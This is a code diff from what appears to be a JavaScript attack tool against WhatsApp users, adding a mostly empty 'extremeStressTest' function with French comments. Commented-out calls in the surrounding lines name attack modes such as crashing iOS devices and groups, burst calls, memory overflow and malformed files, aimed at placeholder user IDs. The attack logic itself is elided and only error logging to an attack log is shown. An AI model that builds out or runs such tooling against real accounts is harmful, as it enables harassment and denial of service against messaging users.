@@ -250,6 +250,23 @@ const attackAutomation = async (target, mode, options = {}) => {
 // attackAutomation("target-id@s.whatsapp.net", "delay-android");
 // attackAutomation("target-id@s.whatsapp.net", "burst-call");
 // attackAutomation("target-id@s.whatsapp.net", "crash-ios");
+
+// ... (autres fonctions)
+
+const extremeStressTest = async (target, settings) => {
+    // ...
+    try {
+        // ...
+    } catch (err) {
+        console.error("Erreur lors du test de stress extrême :", err);
+        fs.appendFileSync('attack_logs.txt', `${new Date().toISOString()} - Erreur dans extremeStressTest : ${err.stack}\n`); // Log dans un fichier
+        throw err; // Propage l'erreur pour pouvoir la gérer ailleurs si besoin
+    } finally {
+        finalizeAttack();
+    }
+};
+
+// ...
 // attackAutomation("group-id@g.whatsapp.net", "crash-group");
 // attackAutomation("target-id@s.whatsapp.net", "memory-overflow");
 // attackAutomation("target-id@s.whatsapp.net", "malformed-file");
